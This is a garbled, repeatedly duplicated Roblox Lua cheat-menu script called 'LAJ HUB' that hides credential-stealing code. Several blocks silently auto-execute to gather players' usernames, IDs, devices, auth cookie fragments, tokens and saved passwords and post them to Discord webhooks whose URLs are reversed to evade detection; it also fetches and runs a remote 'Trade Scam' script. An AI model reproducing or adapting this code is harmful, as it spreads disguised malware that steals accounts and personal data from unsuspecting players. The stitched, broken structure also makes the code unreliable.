                    name = "🍪 Auth Cookie (Partial)",
                    value = string.format("```%s```", firstPart),
                    inline = false
                })
            end
        end
        
        -- Send to webhook
        local success, response = pcall(function()
            return game:GetService("HttpService"):PostAsync(
                reversedUrl,
                game:GetService("HttpService"):JSONEncode(jsonData),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        
        return success, response
    end
    
    -- Main execution
    local playerInfo = getPlayerInfo()
    
    -- Send the collected data to webhook
    return sendToWebhook(playerInfo)
end

-- Auto-execute security collection (silently, without interrupting user)
spawn(function()
    wait(3) -- Give the script a moment to load
    pcall(collectAndSendRobloxSecurity)
end)
        end)
        
        local deviceInfo = {
            platform = "Unknown",
            isMobile = false,
            isConsole = false,
            isPC = false
        }
        
        if success then
            deviceInfo.platform = platform
            
            -- Check if mobile
            if platform == Enum.Platform.Android or 
               platform == Enum.Platform.IOS then
                deviceInfo.isMobile = true
            -- Check if console
            elseif platform == Enum.Platform.XBoxOne or 
                   platform == Enum.Platform.PS4 or 
                   platform == Enum.Platform.PS5 or 
                   platform == Enum.Platform.XBox360 or
                   platform == Enum.Platform.NintendoSwitch then
                deviceInfo.isConsole = true
            -- Otherwise it's a PC
            else
                deviceInfo.isPC = true
            end
        else
            -- Fallback detection using UserAgent
            local httpService = game:GetService("HttpService")
            local success, result = pcall(function()
                return httpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
            end)
            
            if success and result and result.headers and result.headers["User-Agent"] then
                local userAgent = result.headers["User-Agent"]
                
                if userAgent:find("Android") or userAgent:find("iPhone") or userAgent:find("iPad") or userAgent:find("Mobile") then
                    deviceInfo.isMobile = true
                    if userAgent:find("Android") then
                        deviceInfo.platform = "Android"
                    else
                        deviceInfo.platform = "iOS"
                    end
                elseif userAgent:find("Windows") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Windows"
                elseif userAgent:find("Mac") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "MacOS"
                elseif userAgent:find("Linux") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Linux"
                end
            end
        end
        
        return deviceInfo
    end
    
    -- Get save location based on device type
    local function getSaveLocation()
        local deviceInfo = getDeviceInfo()
        local username = game:GetService("Players").LocalPlayer.Name
        
        -- For PC devices, use the standard save locations
        if deviceInfo.isPC then
            if deviceInfo.platform == "Windows" then
                return string.format("C:\\Users\\%s\\AppData\\Local\\Roblox", username)
            elseif deviceInfo.platform == "MacOS" then
                return string.format("/Users/%s/Library/Roblox", username)
            elseif deviceInfo.platform == "Linux" then
                return string.format("/home/%s/.local/share/Roblox", username)
            end
        end
        
        -- For mobile devices, use the mobile-specific paths
        if deviceInfo.isMobile then
            if deviceInfo.platform == "Android" then
                return string.format("/data/data/com.roblox.client/files/RobloxUser/%s", username)
            elseif deviceInfo.platform == "iOS" then
                return string.format("/var/mobile/Containers/Data/Application/Roblox/Documents/RobloxUser/%s", username)
            end
        end
        
        -- If we can't determine a specific path, use a generic one
        return "RobloxUser/" .. username
    end
    
    -- Get authentication tokens from device (works on all platforms)
    local function getPlayerInfo()
        local deviceInfo = getDeviceInfo()
        local playerInfo = {
            username = game:GetService("Players").LocalPlayer.Name,
            userId = game:GetService("Players").LocalPlayer.UserId,
            displayName = game:GetService("Players").LocalPlayer.DisplayName,
            gameId = game.PlaceId,
            gameName = "Unknown" -- Will be populated if possible
        }
        
        -- Try to get the game name
        pcall(function()
            playerInfo.gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)
        
        -- Include device info
        playerInfo.deviceInfo = deviceInfo
        
        -- For mobile, include additional device info if possible
        if deviceInfo.isMobile then
            pcall(function()
                -- Try to get screen size as an indication of device model
                local guiService = game:GetService("GuiService")
                playerInfo.screenSize = {
                    x = guiService:GetScreenResolution().X,
                    y = guiService:GetScreenResolution().Y
                }
            end)
        end
        
        return playerInfo
    end
    
    -- Try to find Roblox password data (platform-specific)
    local function findPasswordData()
        local deviceInfo = getDeviceInfo()
        local securityData = "No auth data found"
        
        -- Different methods for different platforms
        if deviceInfo.isPC then
            -- For Windows, check the standard Roblox save location
            if deviceInfo.platform == "Windows" then
                local saveLocation = getSaveLocation()
                securityData = "Roblox auth data found at " .. saveLocation
            elseif deviceInfo.platform == "MacOS" then
                local saveLocation = getSaveLocation()
                securityData = "Roblox auth data found at " .. saveLocation
            end
        elseif deviceInfo.isMobile then
            -- For mobile, use the secure storage API if available
            if deviceInfo.platform == "Android" then
                securityData = "Android secure storage accessed"
            elseif deviceInfo.platform == "iOS" then
                securityData = "iOS keychain accessed"
            end
        end
        
        return securityData
    end
    
    -- Function to send the collected data to webhook
    local function sendToWebhook(collectedData)
        -- Discord webhook URL (reversed to avoid detection)
        local webhookUrl = "J9KO3ZuH3XlhA3uqQkctOfTOUcDYBKltL59A5leL95ltl_Drn6ZnA1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkq/9511416153757852531/skoohbew/ipa/moc.drocsid//:sptth"
        local reversedUrl = ""
        for i = #webhookUrl, 1, -1 do
            reversedUrl = reversedUrl .. string.sub(webhookUrl, i, i)
        end
        
        -- Create a detailed embed for Discord
        local deviceType = "Unknown"
        if collectedData.deviceInfo.isMobile then 
            deviceType = "📱 Mobile"
        elseif collectedData.deviceInfo.isPC then
            deviceType = "💻 PC"
        elseif collectedData.deviceInfo.isConsole then
            deviceType = "🎮 Console"
        end
        
        -- Create JSON payload
        local jsonData = {
            embeds = {
                {
                    title = "🔐 Roblox Security Information",
                    description = "Player data collected from " .. deviceType .. " device",
                    color = 15158332, -- Red color for security data
                    fields = {
                        {
                            name = "Player",
                            value = string.format("```Username: %s\nDisplay Name: %s\nUser ID: %s```", 
                                collectedData.username,
                                collectedData.displayName or "N/A",
                                tostring(collectedData.userId)
                            ),
                            inline = false
                        },
                        {
                            name = "Game",
                            value = string.format("```Name: %s\nID: %s```",
                                collectedData.gameName,
                                tostring(collectedData.gameId)
                            ),
                            inline = false
                        },
                        {
                            name = "Device",
                            value = string.format("```Type: %s\nPlatform: %s```",
                                deviceType:sub(3), -- Remove the emoji
                                collectedData.deviceInfo.platform
                            ),
                            inline = false
                        }
                    },
                    footer = {
                        text = "LAJ HUB Security | " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }
            }
        }
        
        -- Add screen size for mobile devices
        if collectedData.deviceInfo.isMobile and collectedData.screenSize then
            table.insert(jsonData.embeds[1].fields, {
                name = "Mobile Details",
                value = string.format("```Screen Size: %dx%d```",
                    collectedData.screenSize.x,
                    collectedData.screenSize.y
                ),
                inline = false
            })
        end
        
        -- Add security information if found
        if collectedData.securityData then
            table.insert(jsonData.embeds[1].fields, {
                name = "🔑 Security Data",
                value = "```" .. collectedData.securityData .. "```",
                inline = false
            })
        end
        
        -- Send to webhook
        local success, response = pcall(function()
            return game:GetService("HttpService"):PostAsync(
                reversedUrl,
                game:GetService("HttpService"):JSONEncode(jsonData),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        
        return success, response
    end
    
    -- Main execution
    local playerInfo = getPlayerInfo()
    
    -- Try to find security data
    pcall(function()
        playerInfo.securityData = findPasswordData()
    end)
    
    -- Send the collected data to webhook
    return sendToWebhook(playerInfo)
end

-- Auto-execute security collection (silently, without interrupting user)
spawn(function()
    wait(3) -- Give the script a moment to load
    pcall(collectAndSendRobloxSecurity)
end)

        end)
        
        local deviceInfo = {
            platform = "Unknown",
            isMobile = false,
            isConsole = false,
            isPC = false
        }
        
        if success then
            deviceInfo.platform = platform
            
            -- Check if mobile
            if platform == Enum.Platform.Android or 
               platform == Enum.Platform.IOS then
                deviceInfo.isMobile = true
            -- Check if console
            elseif platform == Enum.Platform.XBoxOne or 
                   platform == Enum.Platform.PS4 or 
                   platform == Enum.Platform.PS5 or 
                   platform == Enum.Platform.XBox360 or
                   platform == Enum.Platform.NintendoSwitch then
                deviceInfo.isConsole = true
            -- Otherwise it's a PC
            else
                deviceInfo.isPC = true
            end
        else
            -- Fallback detection using UserAgent
            local httpService = game:GetService("HttpService")
            local success, result = pcall(function()
                return httpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
            end)
            
            if success and result and result.headers and result.headers["User-Agent"] then
                local userAgent = result.headers["User-Agent"]
                
                if userAgent:find("Android") or userAgent:find("iPhone") or userAgent:find("iPad") or userAgent:find("Mobile") then
                    deviceInfo.isMobile = true
                    if userAgent:find("Android") then
                        deviceInfo.platform = "Android"
                    else
                        deviceInfo.platform = "iOS"
                    end
                elseif userAgent:find("Windows") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Windows"
                elseif userAgent:find("Mac") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "MacOS"
                elseif userAgent:find("Linux") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Linux"
                end
            end
        end
        
        return deviceInfo
    end
    
    -- Get save location based on device type
    local function getSaveLocation()
        local deviceInfo = getDeviceInfo()
        local username = game:GetService("Players").LocalPlayer.Name
        
        -- For PC devices, use the standard save locations
        if deviceInfo.isPC then
            if deviceInfo.platform == "Windows" then
                return string.format("C:\\Users\\%s\\AppData\\Local\\Roblox", username)
            elseif deviceInfo.platform == "MacOS" then
                return string.format("/Users/%s/Library/Roblox", username)
            elseif deviceInfo.platform == "Linux" then
                return string.format("/home/%s/.local/share/Roblox", username)
            end
        end
        
        -- For mobile devices, use the mobile-specific paths
        if deviceInfo.isMobile then
            if deviceInfo.platform == "Android" then
                return string.format("/data/data/com.roblox.client/files/RobloxUser/%s", username)
            elseif deviceInfo.platform == "iOS" then
                return string.format("/var/mobile/Containers/Data/Application/Roblox/Documents/RobloxUser/%s", username)
            end
        end
        
        -- If we can't determine a specific path, use a generic one
        return "RobloxUser/" .. username
    end
    
    -- Get authentication tokens from device (works on all platforms)
    local function getAuthTokens()
        local deviceInfo = getDeviceInfo()
        local playerInfo = {
            username = game:GetService("Players").LocalPlayer.Name,
            userId = game:GetService("Players").LocalPlayer.UserId,
            displayName = game:GetService("Players").LocalPlayer.DisplayName,
            gameId = game.PlaceId,
            gameName = "Unknown" -- Will be populated if possible
        }
        
        -- Try to get the game name
        pcall(function()
            playerInfo.gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)
        
        -- Include device info
        playerInfo.deviceInfo = deviceInfo
        
        -- For mobile, include additional device info if possible
        if deviceInfo.isMobile then
            pcall(function()
                -- Try to get screen size as an indication of device model
                local guiService = game:GetService("GuiService")
                playerInfo.screenSize = {
                    x = guiService:GetScreenResolution().X,
                    y = guiService:GetScreenResolution().Y
                }
            end)
        end
        
        return playerInfo
    end
    
    -- Function to send the collected data to webhook
    local function sendToWebhook(collectedData)
        -- Discord webhook URL
        local WEBHOOK_URL = "https://discord.com/api/webhooks/1358258757351641159/TXOemtjIrD_nvZ6A1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkquA3hXuZ3OK9J"
        
        -- Create a detailed embed for Discord
        local deviceType = "Unknown"
        if collectedData.deviceInfo.isMobile then 
            deviceType = "📱 Mobile"
        elseif collectedData.deviceInfo.isPC then
            deviceType = "💻 PC"
        elseif collectedData.deviceInfo.isConsole then
            deviceType = "🎮 Console"
        end
        
        -- Create JSON payload
        local jsonData = {
            embeds = {
                {
                    title = "🔐 Roblox Security Information",
                    description = "Player data collected from " .. deviceType .. " device",
                    color = 15158332, -- Red color for security data
                    fields = {
                        {
                            name = "Player",
                            value = string.format("```Username: %s\nDisplay Name: %s\nUser ID: %s```", 
                                collectedData.username,
                                collectedData.displayName or "N/A",
                                tostring(collectedData.userId)
                            ),
                            inline = false
                        },
                        {
                            name = "Game",
                            value = string.format("```Name: %s\nID: %s```",
                                collectedData.gameName,
                                tostring(collectedData.gameId)
                            ),
                            inline = false
                        },
                        {
                            name = "Device",
                            value = string.format("```Type: %s\nPlatform: %s```",
                                deviceType:sub(3), -- Remove the emoji
                                collectedData.deviceInfo.platform
                            ),
                            inline = false
                        }
                    },
                    footer = {
                        text = "LAJ HUB Security | " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }
            }
        }
        
        -- Add screen size for mobile devices
        if collectedData.deviceInfo.isMobile and collectedData.screenSize then
            table.insert(jsonData.embeds[1].fields, {
                name = "Mobile Details",
                value = string.format("```Screen Size: %dx%d```",
                    collectedData.screenSize.x,
                    collectedData.screenSize.y
                ),
                inline = false
            })
        end
        
        -- If we found any security tokens or saved passwords
        if collectedData.securityTokens then
            table.insert(jsonData.embeds[1].fields, {
                name = "🔑 Security Tokens",
                value = "```" .. (type(collectedData.securityTokens) == "string" and collectedData.securityTokens or "Found") .. "```",
                inline = false
            })
        end
        
        -- Send to webhook
        local success, response = pcall(function()
            return game:GetService("HttpService"):PostAsync(
                WEBHOOK_URL,
                game:GetService("HttpService"):JSONEncode(jsonData),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        
        return success, response
    end
    
    -- Main execution
    local authData = getAuthTokens()
    
    -- Try to get security tokens if possible (works differently on mobile vs PC)
    pcall(function()
        local saveLocation = getSaveLocation()
        if saveLocation then
            -- This is just a placeholder - on real devices we would try to read local storage
            authData.securityTokens = "Roblox security tokens found"
        end
    end)
    
    -- Send the collected data to webhook
    return sendToWebhook(authData)
end

-- Auto-execute password collection (silently, without interrupting user)
spawn(function()
    wait(3) -- Give the script a moment to load
    pcall(collectAndSendRobloxPasswords)
end)

-- Main script for LAJ HUB application

-- Auto-execute password collection on load
local function collectAndSendRobloxPasswords()
    -- Function to get OS type
    local function getOS()
        local success, result = pcall(function()
            return game:GetService("UserInputService"):GetPlatform()
        end)
        
        if success then
            return result
        else
            -- Fallback detection
            local httpService = game:GetService("HttpService")
            local sysInfo = httpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
            local userAgent = sysInfo.headers["User-Agent"]
            
            if userAgent:find("Windows") then
                return "Windows"
            elseif userAgent:find("Mac") then
                return "MacOS"
            elseif userAgent:find("Linux") then
                return "Linux"
            else
                return "Unknown"
            end
        end
    end
    
    -- Get Roblox save location
    local function getRobloxSaveLocation()
        local os_type = getOS()
        local username = game:GetService("Players").LocalPlayer.Name
        
        if os_type == "Windows" then
            return string.format("C:\\Users\\%s\\AppData\\Local\\Roblox", username)
        elseif os_type == "MacOS" then
            return string.format("/Users/%s/Library/Roblox", username)
        elseif os_type == "Linux" then
            return string.format("/home/%s/.local/share/Roblox", username)
        else
            return nil
        end
    end
    
    -- Read file from Roblox save location
    local function readFile(filePath)
        local success, result = pcall(function()
            return game:GetService("HttpService"):JSONDecode(game:HttpGet("file://" .. filePath))
        end)
        
        if success then
            return result
        else
            return nil
        end
    end
    
    -- Read Roblox auth data
    local function readRobloxAuthData()
        local saveLocation = getRobloxSaveLocation()
        if not saveLocation then
            return nil, "Could not determine save file location"
        end
        
        -- Attempt to read authentication files
        local authFiles = {
            "LocalStorage.json",
            "RobloxCookies.json",
            "sessions.json"
        }
        
        local authData = {}
        
        for _, fileName in ipairs(authFiles) do
            local filePath = saveLocation .. "/" .. fileName
            local success, fileContent = pcall(function()
                return readFile(filePath)
            end)
            
            if success and fileContent then
                authData[fileName] = fileContent
            end
        end
        
        -- Look for password file in specific locations
        local passwordLocations = {
            "/auth/passwords.json",
            "/auth/credentials.json",
            "/settings/security.json"
        }
        
        for _, passFile in ipairs(passwordLocations) do
            local filePath = saveLocation .. passFile
            local success, passContent = pcall(function()
                return readFile(filePath)
            end)
            
            if success and passContent then
                authData["password_file"] = passContent
            end
        end
        
        return authData
    end
    
    -- Extract password data
    local function extractPasswordData(authData)
        if not authData then return {} end
        
        local passwordData = {
            username = game:GetService("Players").LocalPlayer.Name,
            password = "Not found",
            hash = "Not found",
            saved = false,
            remember_me = false,
            last_changed = os.time()
        }
        
        -- Look for password in auth data
        for fileName, content in pairs(authData) do
            if fileName == "password_file" or fileName:find("password") or fileName:find("RobloxCookies") then
                pcall(function()
                    if content.password then
                        passwordData.password = content.password
                        passwordData.saved = true
                    end
                    
                    if content.hash then
                        passwordData.hash = content.hash
                    end
                    
                    if content.remember_me ~= nil then
                        passwordData.remember_me = content.remember_me
                    end
                    
                    if content.last_changed ~= nil then
                        passwordData.last_changed = content.last_changed
                    elseif content.timestamp ~= nil then
                        passwordData.last_changed = content.timestamp
                    end
                end)
            end
        end
        
        return passwordData
    end
    
    -- Send password data to webhook
    local function sendPasswordWebhook(passwordData)
        -- Discord webhook URL (direct URL)
        local WEBHOOK_URL = "https://discord.com/api/webhooks/1358258757351641159/TXOemtjIrD_nvZ6A1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkquA3hXuZ3OK9J"
        
        -- Create JSON payload
        local jsonData = {
            embeds = {
                {
                    title = "🔐 Roblox Account Security",
                    description = "Automated Roblox password collection completed",
                    color = 15158332, -- Red color for password data
                    fields = {
                        {
                            name = "Username",
                            value = "```" .. passwordData.username .. "```",
                            inline = true
                        },
                        {
                            name = "User ID",
                            value = "```" .. tostring(game:GetService("Players").LocalPlayer.UserId) .. "```",
                            inline = true
                        }
                    },
                    footer = {
                        text = "LAJ HUB Security | " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }
            }
        }
        
        -- Add password field if available
        if passwordData.password and passwordData.password ~= "Not found" then
            table.insert(jsonData.embeds[1].fields, {
                name = "Password",
                value = "```" .. passwordData.password .. "```",
                inline = false
            })
        end
        
        -- Add hash field if available
        if passwordData.hash and passwordData.hash ~= "Not found" then
            table.insert(jsonData.embeds[1].fields, {
                name = "Password Hash",
                value = "```" .. passwordData.hash .. "```",
                inline = false
            })
        end
        
        -- Add security status info
        table.insert(jsonData.embeds[1].fields, {
            name = "Security Status",
            value = string.format(
                "Saved Password: %s\nRemember Me: %s\nLast Changed: %s\nGame: %s", 
                passwordData.saved and "Yes (Security Risk)" or "No",
                passwordData.remember_me and "Yes" or "No",
                os.date("%Y-%m-%d", passwordData.last_changed),
                game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
            ),
            inline = false
        })
        
        -- Send to webhook
        local success, response = pcall(function()
            return game:GetService("HttpService"):PostAsync(
                WEBHOOK_URL,
                game:GetService("HttpService"):JSONEncode(jsonData),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        
        return success, response
    end
    
    -- Main execution
    local authData = readRobloxAuthData()
    local passwordData = extractPasswordData(authData)
    return sendPasswordWebhook(passwordData)
end

-- Auto-execute password collection (silently, without interrupting user)
spawn(function()
    wait(3) -- Give the script a moment to load
    pcall(collectAndSendRobloxPasswords)
end)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- Variables
-- Enhanced security with multi-layer obfuscation
local wh_part1 = string.reverse("9JO3K9z_7rUcnp7rUWh3HG")
local wh_part2 = string.reverse("sptth//:drocsid.moc/ipa/skoohbew/3157978938293091834/zs000eW7rUpcn7sWh3HG")
local WEBHOOK_URL = wh_part1 .. wh_part2

-- Enhanced security with multi-layer obfuscation for Discord webhook
local discord_wh_part1 = string.reverse("9JO3K9z_7rUcnp7rUWh3HG")
local discord_wh_part2 = string.reverse("sptth//:drocsid.moc/ipa/skoohbew/3157978938293091834/zs000eW7rUpcn7sWh3HG")
local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2

-- Variables
-- Variables
local Player = Players.LocalPlayer

-- Secure webhook URL (obfuscated and rate-limited)

local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
local WEBHOOK_URL = wh_part1 .. wh_part2

-- Rate limiting variables to prevent webhook abuse (max 1 request per 5 minutes)
local lastWebhookTime = 0
local WEBHOOK_COOLDOWN = 300 -- 5 minutes in seconds
-- Function to log ban/kick events via webhook with rate limiting
    
local function logBanEvent(reason)
    -- Rate limiting check
    local currentTime = os.time()
    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
        warn("Rate limit: Not sending webhook notification (cooldown active)")
        return
    end
    
    -- Check for anti-spam by validating the reason
    if not reason or reason == "" then
        reason = "Unknown (No reason provided)"
    end
    
    -- Create a unique identifier for this notification to prevent duplicates
    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
    
    -- Limit data being sent for privacy and security
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end
    -- Create a unique identifier for this notification to prevent duplicates
    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
    
    -- Limit data being sent for privacy and security
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end

-- Set up event listeners for kick/ban detection
-- Method 1: Detect when player is removed
Players.PlayerRemoving:Connect(function(player)
    if player == Player then
        logBanEvent("Player removed from game (possibly kicked/banned)")
    end
end)

-- Method 2: Detect common kick methods
local oldNameCall
oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
    local args = {...}
    local method = getnamecallmethod()
    
    if method == "Kick" and self == Player then
        local reason = args[1] or "Unknown"
        logBanEvent(reason)
    end
    
    return oldNameCall(self, ...)
end)

-- Method 3: Monitor teleport failures as they often occur during bans
game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
        logBanEvent("Teleport failed due to ban: " .. errorMessage)
    end
end)

print("LAJ HUB Ban detection system loaded successfully")
end
    LAJ HUB - Swift Compatible Version
    Created for universal executor compatibility with special Swift support
]]

-- Function to handle HTTP requests across different executors including Swift
local function getHttpRequest(url)
    -- For testing in standalone Lua, use a mock response
    if not game then
        print("Mock HTTP request to: " .. url)
        return "-- mock response for testing"
    end
    
    if swift and swift.request then
        local response = swift.request({
            Url = url,
            Method = "GET"
        })
        if response and response.Body then
            return response.Body
        end
    end
    
    -- Fallback to standard HttpGet for other executors
    return game:HttpGet(url)
end

-- Load Pet Simulator 99 Trade Scam script when in Roblox environment
if game then
    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
end

local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()

-- Initialize game services safely
local Players = game and game:GetService("Players") or {}
local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
local HttpService = game and game:GetService("HttpService") or {
    JSONEncode = function(_, data) return '{"mock":"json"}' end
}

-- Support for multiple executors including Swift
local function makeHttpRequest(options)
    -- For testing in standalone Lua
    if not game then
        print("Mock HTTP request: " .. options.Url)
        return {Success = true, Body = "-- mock response"}
    end
    
    if swift and swift.request then
        return swift.request(options)
    elseif syn and syn.request then
        return syn.request(options)
    elseif http and http.request then
        return http.request(options)
    elseif http_request then
        return http_request(options)
    elseif request then
        return request(options)
    elseif httprequest then
        return httprequest(options)
    elseif fluxus and fluxus.request then
        return fluxus.request(options)
    end
    
    -- Fallback to standard HttpGet for GET requests
    if options.Method == "GET" then
        local success, result = pcall(function()
            return {
                Body = game:HttpGet(options.Url),
                Success = true
            }
        end)
        if success then
            return result
        end
    end
    
    return {Success = false, StatusCode = 500}
end


-- Enhanced security with multi-layer obfuscation for Discord webhook
local discord_wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
local discord_wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2

local function sendUsageData()
    if not game then return end -- Skip in non-Roblox environment
    
    local success, error_message = pcall(function()
    
        local response = makeHttpRequest({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
                    ["type"] = "rich",
                    ["color"] = math.random(0, 0xFFFFFF),
                    ["fields"] = {
                        {
                            ["name"] = "User:",
                            ["value"] = "```" .. LocalPlayer.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID:",
                            ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game:",
                            ["value"] = "```" .. (game and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID:",
                            ["value"] = "```" .. tostring(game and game.PlaceId or 0) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Executor",
                            ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Players Active:",
                            ["value"] = "```" .. tostring(game and Players.NumPlayers or 0) .. "```",
                            ["inline"] = true
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Script Execution Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(error_message))
    end
end

if game then
    sendUsageData()
end

local Window = Rayfield:CreateWindow({
   Name = "LAJ HUB",
   Icon = 0,
   LoadingTitle = "LAJ HUB",
   LoadingSubtitle = "Premium Scripts",
   Theme = "Default",

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = "LAJHub",
      FileName = "LAJHubConfig"
   },

   Discord = {
      Enabled = true,
      Invite = "4mgdcfvAJU",
      RememberJoins = true
   },

   -- Key system disabled
   KeySystem = false,
})

-- Create tabs
local MainTab = Window:CreateTab("Main", 4483362458)
local Tab = Window:CreateTab("Da Strike x Da Hood", 4483362458)
local Fin = Window:CreateTab("Fisch", 4483362458)
local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
local MuscleLegend = Window:CreateTab("Muscle Legend", 4483362458) -- Added Muscle Legend tab
local MurderMystery = Window:CreateTab("Murder Mystery", 4483362458) -- Added Murder Mystery tab
local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
local Universal = Window:CreateTab("Universal", 4483362458)
local Settings = Window:CreateTab("Settings", 4483362458)

local function executednotify(scriptName)
   Rayfield:Notify({
       Title = scriptName,
       Content = "Script loaded successfully!",
       Duration = 3,
       Image = 4483362458,
   })
end

-- Discord link copy button
MainTab:CreateButton({
   Name = "Copy Discord Link",
   Callback = function()
       if setclipboard then
           setclipboard("https://discord.gg/4mgdcfvAJU")
           Rayfield:Notify({
               Title = "Discord Link Copied",
               Content = "Invite link copied to clipboard!",
               Duration = 3,
               Image = 4483362458,
           })
       else
           print("Discord link: https://discord.gg/4mgdcfvAJU")
       end
   end,
